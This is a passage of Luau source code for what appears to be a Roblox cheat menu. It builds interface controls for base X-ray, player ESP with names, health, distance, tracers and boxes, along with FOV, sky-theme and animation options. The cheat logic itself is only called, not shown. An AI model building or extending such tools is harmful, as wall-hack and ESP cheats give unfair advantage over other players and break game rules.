								instance3.Size = UDim2.new(1, -24, 0, 6)
								instance3.Position = UDim2.fromOffset(12, 34)
								instance3.BackgroundColor3 = Color3.fromRGB(50, 55, 65)
								instance3.BorderSizePixel = 0
								guiCorner(instance3, 3)
								local nineDuelsBaseXRayTransparency =
									math.clamp(_G.NineDuelsBaseXRayTransparency or 0.5, 0, 1)
								local instance4 = Instance.new("Frame", instance3)
								instance4.Size = UDim2.new(nineDuelsBaseXRayTransparency, 0, 1, 0)
								instance4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								instance4.BorderSizePixel = 0
								guiCorner(instance4, 3)
								local frame6 = Instance.new("Frame", instance3)
								frame6.Size = UDim2.fromOffset(14, 14)
								frame6.Position = UDim2.new(nineDuelsBaseXRayTransparency, -7, 0.5, -7)
								frame6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								frame6.BorderSizePixel = 0
								guiCorner(frame6, 7)
								local textButton3 = Instance.new("TextButton", instance3)
								textButton3.Size = UDim2.new(1, 0, 0, 28)
								textButton3.Position = UDim2.new(0, 0, 0.5, -14)
								textButton3.BackgroundTransparency = 1
								textButton3.Text = ""
								textButton3.ZIndex = 5
								local flag18 = false
								local tween_ = nil
								local flag19 = false

								local function fn44(arg)
									flag18 = arg == true

									if tween_ then
										tween_:Cancel()
									end

									if flag18 then
										instance2.Visible = true
										textButton2.Text = "▲"
										tween_ = TweenService:Create(
											instance2,
											TweenInfo.new(0.24, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
											{ Size = UDim2.new(1, 0, 0, 104) }
										)
										tween_:Play()
									else
										textButton2.Text = "▼"
										tween_ = TweenService:Create(
											instance2,
											TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
											{ Size = UDim2.new(1, 0, 0, 46) }
										)

										tween_.Completed:Connect(function()
											if not flag18 then
												instance2.Visible = true
											end
										end)

										tween_:Play()
									end
								end

								local function fn45(arg)
									local x = instance3.AbsoluteSize.X
									if x <= 0 then
										return
									end
									nineDuelsBaseXRayTransparency = math.floor(
										math.clamp((arg.Position.X - instance3.AbsolutePosition.X) / x, 0, 1) * 100
											+ 0.5
									) / 100
									instance4.Size = UDim2.new(nineDuelsBaseXRayTransparency, 0, 1, 0)
									frame6.Position = UDim2.new(nineDuelsBaseXRayTransparency, -7, 0.5, -7)
									textLabel3.Text = tostring(math.floor(nineDuelsBaseXRayTransparency * 100 + 0.5))
										.. "%"
								end

								textButton3.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag19 = true
										fn45(input)
									end
								end)

								instance3.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag19 = true
										fn45(input)
									end
								end)

								UIS.InputChanged:Connect(function(input)
									if
										flag19
										and (
											input.UserInputType == Enum.UserInputType.MouseMovement
											or input.UserInputType == Enum.UserInputType.Touch
										)
									then
										fn45(input)
									end
								end)

								UIS.InputEnded:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										if flag19 then
											_G.NineDuelsBaseXRayTransparency = nineDuelsBaseXRayTransparency

											if _G.NineDuelsBaseXRayEnabled and _G.NineDuelsSetBaseXRay then
												_G.NineDuelsSetBaseXRay(false)
												_G.NineDuelsSetBaseXRay(true)
											end

											saveConfig()
										end

										flag19 = false
									end
								end)

								textButton2.MouseButton1Click:Connect(function()
									fn44(not flag18)
								end)

								if _G.NineDuelsBaseXRayEnabled then
									pcall(_G.NineDuelsSetBaseXRay, true)
								end

								addSectLbl(visuals, "MOVEMENT VISUALS", 4.5)

								local v89, v90 = addToggleRow(visuals, "Unwalk", unwalkEnabled, 5, nil, function(arg)
									unwalkEnabled = arg

									if arg then
										startUnwalk()
									else
										stopUnwalk()
									end

									saveConfig()
								end)

								setUnwalkVisual = v90
								local v91 = nil

								local frame7 = Instance.new("Frame", visuals)
								frame7.Name = "WalkAnimationsRow"
								frame7.Size = UDim2.new(1, 0, 0, 46)
								frame7.BackgroundColor3 = C.row
								frame7.BackgroundTransparency = 0.03
								frame7.BorderSizePixel = 0
								frame7.LayoutOrder = 5.1
								kuruCard(frame7)
								local textLabel4 = Instance.new("TextLabel", frame7)
								textLabel4.Size = UDim2.new(1, -120, 1, 0)
								textLabel4.Position = UDim2.fromOffset(13, 0)
								textLabel4.BackgroundTransparency = 1
								textLabel4.Text = "Walk animations"
								textLabel4.TextColor3 = C.text
								textLabel4.TextSize = 13
								textLabel4.Font = Enum.Font.GothamMedium
								textLabel4.TextXAlignment = Enum.TextXAlignment.Left
								local textButton4 = Instance.new("TextButton", frame7)
								textButton4.Size = UDim2.new(0, 36, 0, 30)
								textButton4.Position = UDim2.new(1, -96, 0.5, -15)
								textButton4.BackgroundColor3 = C.bgDark
								textButton4.BackgroundTransparency = 0.3
								textButton4.BorderSizePixel = 0
								textButton4.Text = "▼"
								textButton4.TextColor3 = C.textDim
								textButton4.TextSize = 12
								textButton4.Font = Enum.Font.GothamBold
								textButton4.AutoButtonColor = false
								textButton4.ZIndex = 5
								guiCorner(textButton4, 8)
								guiStroke(textButton4, C.divider, 1).Transparency = 0.65
								local frame8 = Instance.new("Frame", frame7)
								frame8.Size = UDim2.fromOffset(44, 22)
								frame8.Position = UDim2.new(1, -54, 0.5, -11)
								frame8.BackgroundColor3 = walkAnimationsEnabled and C.blue or C.blueDim
								frame8.BorderSizePixel = 0
								guiCorner(frame8, 10)
								local frame9 = Instance.new("Frame", frame8)
								frame9.Size = UDim2.fromOffset(16, 16)
								frame9.Position = walkAnimationsEnabled and UDim2.new(1, -19, 0.5, -8)
									or UDim2.fromOffset(3, 3)
								frame9.BackgroundColor3 = walkAnimationsEnabled and C.bgDark or C.textDim
								frame9.BorderSizePixel = 0
								guiCorner(frame9, 7)
								local flag20 = walkAnimationsEnabled

								local function fn46(arg)
									flag20 = arg
									tw(frame8, { BackgroundColor3 = arg and C.blue or C.blueDim })

									tw(frame9, {
										Position = arg and UDim2.new(1, -19, 0.5, -8) or UDim2.fromOffset(3, 3),
										BackgroundColor3 = arg and C.bgDark or C.textDim,
									})
								end

								local frame10 = Instance.new("Frame", visuals)
								frame10.Name = "WalkAnimationOptions"
								frame10.Size = UDim2.new(1, -4, 0, 0)
								frame10.Position = UDim2.fromOffset(2, 0)
								frame10.BackgroundColor3 = C.input
								frame10.BackgroundTransparency = 0.22
								frame10.BorderSizePixel = 0
								frame10.LayoutOrder = 5.2
								frame10.Visible = false
								frame10.ClipsDescendants = true
								kuruCard(frame10)
								local uiGridLayout = Instance.new("UIGridLayout", frame10)
								uiGridLayout.CellSize = UDim2.new(0.25, -6, 0, 34)
								uiGridLayout.CellPadding = UDim2.fromOffset(6, 6)
								uiGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
								uiGridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
								uiGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
								local uiPadding = Instance.new("UIPadding", frame10)
								uiPadding.PaddingTop = UDim.new(0, 6)
								uiPadding.PaddingBottom = UDim.new(0, 6)
								uiPadding.PaddingLeft = UDim.new(0, 6)
								uiPadding.PaddingRight = UDim.new(0, 6)

								for i, v92 in ipairs(WalkAnimationOrder) do
									local textButton5 = Instance.new("TextButton", frame10)
									textButton5.LayoutOrder = i
									textButton5.BackgroundColor3 = v92 == selectedWalkAnimation and C.blue or C.bgDark
									textButton5.BackgroundTransparency = 0.08
									textButton5.BorderSizePixel = 0
									textButton5.Text = v92
									textButton5.TextColor3 = v92 == selectedWalkAnimation and C.bgDark or C.text
									textButton5.TextSize = 9
									textButton5.Font = Enum.Font.GothamBold
									textButton5.TextWrapped = true
									textButton5.AutoButtonColor = false
									guiCorner(textButton5, 7)
									guiStroke(textButton5, C.divider, 1).Transparency = 0.45

									textButton5.MouseButton1Click:Connect(function()
										selectedWalkAnimation = v92

										for _, child in ipairs(frame10:GetChildren()) do
											if child:IsA("TextButton") then
												child.BackgroundColor3 = child.Text == v92 and C.blue or C.bgDark
												child.TextColor3 = child.Text == v92 and C.bgDark or C.text
											end
										end

										if walkAnimationsEnabled then
											applyWalkAnimationPack(selectedWalkAnimation)
										end

										saveConfig()
										notify("Walk animations", selectedWalkAnimation, "selected", 2)
									end)
								end

								local flag21 = false
								local tween_2 = nil

								local function fn47(arg)
									flag21 = arg == true

									if tween_2 then
										tween_2:Cancel()
									end

									if flag21 then
										frame10.Visible = true
										textButton4.Text = "▲"
										tween_2 = TweenService:Create(
											frame10,
											TweenInfo.new(0.24, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
											{ Size = UDim2.new(1, -4, 0, 86) }
										)
										tween_2:Play()
									else
										textButton4.Text = "▼"
										tween_2 = TweenService:Create(
											frame10,
											TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
											{ Size = UDim2.new(1, -4, 0, 0) }
										)

										tween_2.Completed:Connect(function()
											if not flag21 then
												frame10.Visible = false
											end
										end)

										tween_2:Play()
									end
								end

								textButton4.MouseButton1Click:Connect(function()
									fn47(not flag21)
								end)

								local textButton5 = Instance.new("TextButton", frame7)
								textButton5.Size = UDim2.fromOffset(44, 22)
								textButton5.Position = frame8.Position
								textButton5.BackgroundTransparency = 1
								textButton5.Text = ""

								textButton5.MouseButton1Click:Connect(function()
									flag20 = not flag20
									walkAnimationsEnabled = flag20
									fn46(flag20)

									if flag20 then
										if tryardAnimEnabled then
											tryardAnimEnabled = false
											stopTryardAnim()

											if v91 then
												v91(false)
											end
										end

										applyWalkAnimationPack(selectedWalkAnimation)
										notify("Walk animations", selectedWalkAnimation, "activated", 2)
									else
										restoreWalkAnimationPack()
										notify("Walk animations", "Disabled", "deactivated", 2)
									end

									saveConfig()
								end)

								local v92

								v92, v91 = addToggleRow(
									visuals,
									"Sigma Animations",
									tryardAnimEnabled,
									5.3,
									nil,
									function(arg)
										tryardAnimEnabled = arg

										if arg then
											if walkAnimationsEnabled then
												walkAnimationsEnabled = false
												restoreWalkAnimationPack()

												if fn46 then
													fn46(false)
												end
											end

											pcall(startTryardAnim)
										else
											stopTryardAnim()
										end

										saveConfig()
									end
								)

								addSectLbl(visuals, "PLAYER ESP", 6.5)
								local instance5 = nil

								addToggleRow(visuals, "Player ESP", espEnabled, 7, nil, function(visible)
									espEnabled = visible

									if visible then
										pcall(enableESP)

										for _, v93 in pairs(espBBs) do
											if v93 then
												v93.Enabled = true
											end
										end
									else
										for _, v93 in pairs(espBBs) do
											if v93 then
												v93.Enabled = false
											end
										end

										if not espShowHighlight and not espShowTracer then
											clearAllESP()
										end
									end

									if instance5 then
										instance5.Visible = visible
										instance5.Size = visible and UDim2.new(1, 0, 0, 128) or UDim2.new(1, 0, 0, 0)
									end

									saveConfig()
								end)

								instance5 = Instance.new("Frame", visuals)
								instance5.Name = "PlayerESPOptions"
								instance5.Size = espEnabled and UDim2.new(1, 0, 0, 128) or UDim2.new(1, 0, 0, 0)
								instance5.BackgroundTransparency = 1
								instance5.BorderSizePixel = 0
								instance5.LayoutOrder = 7.5
								instance5.Visible = espEnabled
								instance5.ClipsDescendants = true

								local function fn48(text, arg, arg2, arg3)
									local frame11 = Instance.new("Frame", instance5)
									frame11.Size = UDim2.new(1, -16, 0, 28)
									frame11.Position = UDim2.fromOffset(16, arg2)
									frame11.BackgroundColor3 = C.bgDark
									frame11.BackgroundTransparency = 0.18
									frame11.BorderSizePixel = 0
									frame11.ZIndex = 2
									kuruCard(frame11)
									local textLabel5 = Instance.new("TextLabel", frame11)
									textLabel5.Size = UDim2.new(1, -66, 1, 0)
									textLabel5.Position = UDim2.fromOffset(12, 0)
									textLabel5.BackgroundTransparency = 1
									textLabel5.Text = text
									textLabel5.TextColor3 = C.textMuted
									textLabel5.TextSize = 11
									textLabel5.Font = Enum.Font.GothamMedium
									textLabel5.TextXAlignment = Enum.TextXAlignment.Left
									textLabel5.ZIndex = 3
									local instance6 = Instance.new("Frame", frame11)
									instance6.Size = UDim2.fromOffset(32, 16)
									instance6.Position = UDim2.new(1, -44, 0.5, -8)
									instance6.BackgroundColor3 = arg and C.blue or C.blueDim
									instance6.BorderSizePixel = 0
									instance6.ZIndex = 3
									guiCorner(instance6, 8)
									local frame12 = Instance.new("Frame", instance6)
									frame12.Size = UDim2.fromOffset(12, 12)
									frame12.Position = arg and UDim2.new(1, -14, 0.5, -6) or UDim2.fromOffset(2, 2)
									frame12.BackgroundColor3 = arg and C.bgDark or C.textDim
									frame12.BorderSizePixel = 0
									frame12.ZIndex = 4
									guiCorner(frame12, 50)
									local textButton6 = Instance.new("TextButton", frame11)
									textButton6.Size = UDim2.fromScale(1, 1)
									textButton6.BackgroundTransparency = 1
									textButton6.Text = ""
									textButton6.ZIndex = 5
									local flag22 = arg

									local function fn49(arg4)
										flag22 = arg4
										tw(instance6, { BackgroundColor3 = arg4 and C.blue or C.blueDim })

										tw(frame12, {
											Position = arg4 and UDim2.new(1, -14, 0.5, -6) or UDim2.fromOffset(2, 2),
											BackgroundColor3 = arg4 and C.bgDark or C.textDim,
										})
									end

									textButton6.MouseButton1Click:Connect(function()
										flag22 = not flag22
										fn49(flag22)
										arg3(flag22)
										saveConfig()
									end)
								end

								fn48("Show Name", espShowName, 0, function(arg)
									espShowName = arg
								end)

								fn48("Show Health", espShowHealth, 32, function(arg)
									espShowHealth = arg
								end)

								fn48("Show Distance", espShowDistance, 64, function(arg)
									espShowDistance = arg
								end)

								fn48("Show Speed", espShowSpeed, 96, function(arg)
									espShowSpeed = arg
								end)

								instance5.Size = espEnabled and UDim2.new(1, 0, 0, 128) or UDim2.new(1, 0, 0, 0)

								addToggleRow(visuals, "Box ESP", espShowHighlight, 8, nil, function(arg)
									espShowHighlight = arg

									if arg and not espActive then
										pcall(enableESP)
									end

									if espActive then
										for _, player_ in ipairs(Players:GetPlayers()) do
											if player_ ~= LP then
												if arg then
													fn32(player_, player_.Character)
												else
													fn31(player_)
												end
											end
										end
									end

									if not arg and not espEnabled and not espShowTracer then
										clearAllESP()
									end

									saveConfig()
								end)

								addToggleRow(visuals, "Tracer ESP", espShowTracer, 9, nil, function(arg)
									espShowTracer = arg

									if arg and not espActive then
										pcall(enableESP)
									end

									local flag22 = not arg

									if flag22 then
										for _, v93 in pairs(espTracers) do
											v93.Visible = false
										end
									end

									if flag22 and not espEnabled and not espShowHighlight then
										clearAllESP()
									end

									saveConfig()
								end)

								addToggleRow(visuals, "Under Feet", espUnderFeet, 12, nil, function(arg)
									espUnderFeet = arg
									saveConfig()
								end)

								addSectLbl(visuals, "SELF-PLAYER ESP", 14)

								addToggleRow(visuals, "Self Highlight", selfEspEnabled, 14.1, nil, function(arg)
									applySelfESP(arg)
									saveConfig()
								end)

								addToggleRow(visuals, "Self Box ESP", selfBoxEspEnabled, 14.2, nil, function(arg)
									applySelfBoxESP(arg)
									saveConfig()
								end)

								addSectLbl(visuals, "SKY THEME", 17)
								local frame11 = Instance.new("Frame")
								frame11.Size = UDim2.new(1, 0, 0, 76)
								frame11.BackgroundTransparency = 1
								frame11.BorderSizePixel = 0
								frame11.LayoutOrder = 17
								frame11.Parent = visuals
								local scrollingFrame = Instance.new("ScrollingFrame", frame11)
								scrollingFrame.Size = UDim2.new(1, 0, 1, 0)
								scrollingFrame.BackgroundTransparency = 1
								scrollingFrame.BorderSizePixel = 0
								scrollingFrame.ScrollBarThickness = 2
								scrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(180, 180, 180)
								scrollingFrame.ScrollBarImageTransparency = 0.5
								scrollingFrame.CanvasSize = UDim2.new(0, 0, 1, 0)
								scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.X
								scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
								scrollingFrame.ElasticBehavior = Enum.ElasticBehavior.Never
								scrollingFrame.Active = true
								local uiListLayout = Instance.new("UIListLayout", scrollingFrame)
								uiListLayout.FillDirection = Enum.FillDirection.Horizontal
								uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
								uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
								uiListLayout.Padding = UDim.new(0, 50)
								local uiPadding2 = Instance.new("UIPadding", scrollingFrame)
								uiPadding2.PaddingLeft = UDim.new(0, 4)
								uiPadding2.PaddingRight = UDim.new(0, 4)
								local tbl17 = {}
								local tbl18 = {}

								local function fn49(arg)
									for k, v93 in pairs(tbl17) do
										local flag22 = k == arg
										v93.Color = flag22 and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(60, 60, 68)
										v93.Thickness = flag22 and 1.8 or 1
									end

									for k, v93 in pairs(tbl18) do
										v93.TextColor3 = k == arg and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(140, 140, 150)
									end
								end

								for i, v93 in ipairs(SkyOrder) do
									local instance6 = Instance.new("Frame", scrollingFrame)
									instance6.LayoutOrder = i
									instance6.Size = UDim2.new(0, 60, 0, 54)
									instance6.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
									instance6.BorderSizePixel = 0
									guiCorner(instance6, 8)
									tbl17[v93] = guiStroke(
										instance6,
										v93 == currentSkyTheme and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(60, 60, 68),
										v93 == currentSkyTheme and 1.8 or 1
									)
									local instance7 = Instance.new("TextLabel", instance6)
									instance7.Size = UDim2.new(1, -4, 1, 0)
									instance7.Position = UDim2.fromOffset(2, 0)
									instance7.BackgroundTransparency = 1
									instance7.Text = v93
									instance7.TextSize = 8
									instance7.Font = Enum.Font.GothamBold
									instance7.TextColor3 = v93 == currentSkyTheme and Color3.fromRGB(255, 255, 255)
										or Color3.fromRGB(140, 140, 150)
									instance7.TextWrapped = true
									tbl18[v93] = instance7
									local textButton6 = Instance.new("TextButton", instance6)
									textButton6.Size = UDim2.new(1, 0, 1, 0)
									textButton6.BackgroundTransparency = 1
									textButton6.Text = ""

									textButton6.MouseButton1Click:Connect(function()
										if State.darkModeEnabled then
											State.darkModeEnabled = false

											if v88 then
												v88(false)
											end

											local phantomDarkSky = Lighting:FindFirstChild("phantomDarkSky")

											if phantomDarkSky then
												phantomDarkSky:Destroy()
											end

											Lighting.Brightness = defLightBrightness or 2
											Lighting.ClockTime = defLightClock or 14
											Lighting.ExposureCompensation = 0
											Lighting.OutdoorAmbient = defLightAmbient or Color3.fromRGB(127, 127, 127)
										end

										currentSkyTheme = v93
										CandyApplyCustomSky(v93)
										fn49(v93)
										saveConfig()
									end)
								end

								fn49(currentSkyTheme)
								addSectLbl(visuals, "FOV", 18)
								local frame12 = Instance.new("Frame", visuals)
								frame12.Name = "FOVRow"
								frame12.Size = UDim2.new(1, 0, 0, 60)
								frame12.BackgroundColor3 = C.row
								frame12.BackgroundTransparency = 0.5
								frame12.BorderSizePixel = 0
								frame12.LayoutOrder = 19
								guiCorner(frame12, 10)
								guiStroke(frame12, C.divider, 1)
								local textLabel5 = Instance.new("TextLabel", frame12)
								textLabel5.Size = UDim2.new(0.55, 0, 0, 20)
								textLabel5.Position = UDim2.fromOffset(12, 6)
								textLabel5.BackgroundTransparency = 1
								textLabel5.Text = "FOV Changer"
								textLabel5.TextColor3 = C.text
								textLabel5.Font = Enum.Font.GothamBold
								textLabel5.TextSize = 11
								textLabel5.TextXAlignment = Enum.TextXAlignment.Left
								local instance6 = Instance.new("TextLabel", frame12)
								instance6.Size = UDim2.fromOffset(44, 20)
								instance6.Position = UDim2.new(1, -52, 0, 6)
								instance6.BackgroundTransparency = 1
								instance6.Text = tostring(fovValue)
								instance6.TextColor3 = C.textDim
								instance6.Font = Enum.Font.GothamBold
								instance6.TextSize = 11
								instance6.TextXAlignment = Enum.TextXAlignment.Right
								local frame13 = Instance.new("Frame", frame12)
								frame13.Size = UDim2.new(1, -24, 0, 5)
								frame13.Position = UDim2.new(0, 12, 0, 38)
								frame13.BackgroundColor3 = Color3.fromRGB(50, 50, 58)
								frame13.BorderSizePixel = 0
								guiCorner(frame13, 3)
								local instance7 = Instance.new("Frame", frame13)
								instance7.Size = UDim2.new((fovValue - 60) / 60, 0, 1, 0)
								instance7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								instance7.BorderSizePixel = 0
								guiCorner(instance7, 3)
								local instance8 = Instance.new("Frame", frame13)
								instance8.Size = UDim2.fromOffset(14, 14)
								instance8.Position = UDim2.new((fovValue - 60) / 60, -7, 0.5, -7)
								instance8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								instance8.BorderSizePixel = 0
								guiCorner(instance8, 7)
								local textButton6 = Instance.new("TextButton", frame13)
								textButton6.Size = UDim2.new(1, 0, 0, 28)
								textButton6.Position = UDim2.new(0, 0, 0.5, -14)
								textButton6.BackgroundTransparency = 1
								textButton6.Text = ""
								textButton6.BorderSizePixel = 0

								local function fn50(arg)
									local fieldOfView = math.clamp(math.floor(arg), 60, 120)
									fovValue = fieldOfView
									local n35 = (fieldOfView - 60) / 60
									instance7.Size = UDim2.new(n35, 0, 1, 0)
									instance8.Position = UDim2.new(n35, -7, 0.5, -7)
									instance6.Text = tostring(fieldOfView)
									local currentCamera = workspace.CurrentCamera

									if currentCamera then
										pcall(function()
											currentCamera.FieldOfView = fieldOfView
										end)
									end

									saveConfig()
								end

								setFOVRef = fn50
								local flag22 = false

								local function fn51(arg)
									local absolutePosition = frame13.AbsolutePosition
									local x = frame13.AbsoluteSize.X

									if x > 0 then
										fn50(60 + math.clamp(arg.Position.X - absolutePosition.X, 0, x) / x * 60)
									end
								end

								textButton6.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag22 = true
										fn51(input)
									end
								end)

								frame13.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag22 = true
										fn51(input)
									end
								end)

								UIS.InputChanged:Connect(function(input)
									local flag23 = flag22

									if flag22 then
										flag23 = input.UserInputType == Enum.UserInputType.MouseMovement
											or input.UserInputType == Enum.UserInputType.Touch
									end

									if flag23 then
										fn51(input)
									end
								end)

								UIS.InputEnded:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag22 = false
									end
								end)

								task.spawn(function()
									while visuals.Parent do
										local currentCamera = workspace.CurrentCamera
										local flag23

										if currentCamera then
											flag23 = math.abs((currentCamera.FieldOfView or fovValue) - fovValue) > 0.05
										else
											flag23 = currentCamera
										end

										if flag23 then
											pcall(function()
												currentCamera.FieldOfView = fovValue
											end)
										end

										task.wait(0.35)
									end
								end)

								fn50(fovValue)
								return
							end

							fn42()

							local function fn43()
								local settings = CategoryRefs.contents.Settings
								addSectLbl(settings, "BACKGROUND PICTURES", -1)
								local instance = Instance.new("Frame")
								instance.Size = UDim2.new(1, 0, 0, 68)
								instance.BackgroundTransparency = 1
								instance.BorderSizePixel = 0
								instance.LayoutOrder = 0
								instance.Parent = settings
								local scrollingFrame = Instance.new("ScrollingFrame", instance)
								scrollingFrame.Size = UDim2.new(1, 0, 1, 0)
								scrollingFrame.BackgroundTransparency = 1
								scrollingFrame.BorderSizePixel = 0
								scrollingFrame.ScrollBarThickness = 2
								scrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(180, 180, 180)
								scrollingFrame.ScrollBarImageTransparency = 0.4
								scrollingFrame.CanvasSize = UDim2.new(0, 0, 1, 0)
								scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.X
								scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
								scrollingFrame.ElasticBehavior = Enum.ElasticBehavior.Never
								scrollingFrame.Active = true
								local uiListLayout = Instance.new("UIListLayout", scrollingFrame)
								uiListLayout.FillDirection = Enum.FillDirection.Horizontal
								uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
								uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
								uiListLayout.Padding = UDim.new(0, 50)
								local uiPadding = Instance.new("UIPadding", scrollingFrame)
								uiPadding.PaddingLeft = UDim.new(0, 4)
								uiPadding.PaddingRight = UDim.new(0, 4)
								local tbl17 = {}
								local instance2 = nil

								local function fn44(arg)
									for k, v86 in pairs(tbl17) do
										v86.Color = k == arg and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(60, 60, 68)
										v86.Thickness = k == arg and 1.8 or 1
									end

									if instance2 then
										instance2.TextColor3 = arg == 0 and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(180, 180, 190)
									end
								end

								local frame = Instance.new("Frame", scrollingFrame)
								frame.LayoutOrder = 0
								frame.Size = UDim2.new(0, 52, 0, 54)
								frame.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
								frame.BorderSizePixel = 0
								guiCorner(frame, 8)
								tbl17[0] = guiStroke(
									frame,
									backgroundIndex == 0 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 60, 68),
									backgroundIndex == 0 and 1 or 1
								)
								instance2 = Instance.new("TextLabel", frame)
								instance2.Size = UDim2.new(1, 0, 1, 0)
								instance2.BackgroundTransparency = 1
								instance2.Text = "None"
								instance2.TextSize = 10
								instance2.Font = Enum.Font.GothamBold
								instance2.TextColor3 = backgroundIndex == 0 and Color3.fromRGB(255, 255, 255)
									or Color3.fromRGB(140, 140, 150)
								local textButton = Instance.new("TextButton", frame)
								textButton.Size = UDim2.new(1, 0, 1, 0)
								textButton.BackgroundTransparency = 1
								textButton.Text = ""

								textButton.MouseButton1Click:Connect(function()
									applyBackgroundImage(0)

									if GuiRefs.bgGrad then
										GuiRefs.bgGrad.Visible = false
									end

									fn44(0)
									saveConfig()
								end)

								for _, v86 in ipairs(ALLOWED_IMAGE_INDICES) do
									local frame2 = Instance.new("Frame", scrollingFrame)
									frame2.LayoutOrder = v86
									frame2.Size = UDim2.new(0, 72, 0, 54)
									frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
									frame2.BackgroundTransparency = 0
									frame2.BorderSizePixel = 0
									guiCorner(frame2, 8)
									tbl17[v86] = guiStroke(
										frame2,
										backgroundIndex == v86 and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(60, 60, 68),
										backgroundIndex == v86 and 1 or 1
									)
									local imageLabel = Instance.new("ImageLabel", frame2)
									imageLabel.Size = UDim2.new(1, 0, 1, 0)
									imageLabel.BackgroundTransparency = 1
									imageLabel.ScaleType = Enum.ScaleType.Crop
									imageLabel.ImageTransparency = 0
									guiCorner(imageLabel, 8)
									setImage(imageLabel, BG_IMAGES[v86])
									local instance3 = Instance.new("TextLabel", frame2)
									instance3.Size = UDim2.new(0, 16, 0, 14)
									instance3.Position = UDim2.new(1, -18, 1, -16)
									instance3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
									instance3.BackgroundTransparency = 0.35
									instance3.BorderSizePixel = 0
									instance3.Text = tostring(v86)
									instance3.TextSize = 8
									instance3.Font = Enum.Font.GothamBold
									instance3.TextColor3 = Color3.fromRGB(255, 255, 255)
									guiCorner(instance3, 4)
									local textButton2 = Instance.new("TextButton", frame2)
									textButton2.Size = UDim2.new(1, 0, 1, 0)
									textButton2.BackgroundTransparency = 1
									textButton2.Text = ""

									textButton2.MouseButton1Click:Connect(function()
										backgroundIndex = v86
										backgroundEnabled = true
										setImage(GuiRefs.backgroundImage, BG_IMAGES[v86])

										if GuiRefs.backgroundImage then
											GuiRefs.backgroundImage.Visible = true
										end

										if GuiRefs.dimOverlay then
											GuiRefs.dimOverlay.Visible = true
										end

										if GuiRefs.bgGrad then
											GuiRefs.bgGrad.Visible = false
										end

										fn44(v86)

										if instance2 then
											instance2.TextColor3 = Color3.fromRGB(180, 180, 190)
										end

										saveConfig()
									end)
								end

								if backgroundIndex == 0 and instance2 then
									instance2.TextColor3 = Color3.fromRGB(255, 255, 255)
								end

								addSectLbl(settings, "STEAL BAR PICTURES", 0)
								local frame2 = Instance.new("Frame")
								frame2.Size = UDim2.new(1, 0, 0, 68)
								frame2.BackgroundTransparency = 1
								frame2.BorderSizePixel = 0
								frame2.LayoutOrder = 0
								frame2.Parent = settings
								local scrollingFrame2 = Instance.new("ScrollingFrame", frame2)
								scrollingFrame2.Size = UDim2.new(1, 0, 1, 0)
								scrollingFrame2.BackgroundTransparency = 1
								scrollingFrame2.BorderSizePixel = 0
								scrollingFrame2.ScrollBarThickness = 2
								scrollingFrame2.ScrollBarImageColor3 = Color3.fromRGB(180, 180, 180)
								scrollingFrame2.ScrollBarImageTransparency = 0.6
								scrollingFrame2.CanvasSize = UDim2.new(0, 0, 1, 0)
								scrollingFrame2.AutomaticCanvasSize = Enum.AutomaticSize.X
								scrollingFrame2.ScrollingDirection = Enum.ScrollingDirection.X
								scrollingFrame2.ElasticBehavior = Enum.ElasticBehavior.Never
								scrollingFrame2.Active = true
								local uiListLayout2 = Instance.new("UIListLayout", scrollingFrame2)
								uiListLayout2.FillDirection = Enum.FillDirection.Horizontal
								uiListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
								uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
								uiListLayout2.Padding = UDim.new(0, 6)
								local uiPadding2 = Instance.new("UIPadding", scrollingFrame2)
								uiPadding2.PaddingLeft = UDim.new(0, 4)
								uiPadding2.PaddingRight = UDim.new(0, 4)
								local tbl18 = {}
								local instance3 = nil

								local function fn45(arg)
									for k, v86 in pairs(tbl18) do
										v86.Color = k == arg and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(60, 60, 68)
										v86.Thickness = k == arg and 1.8 or 1
									end

									if instance3 then
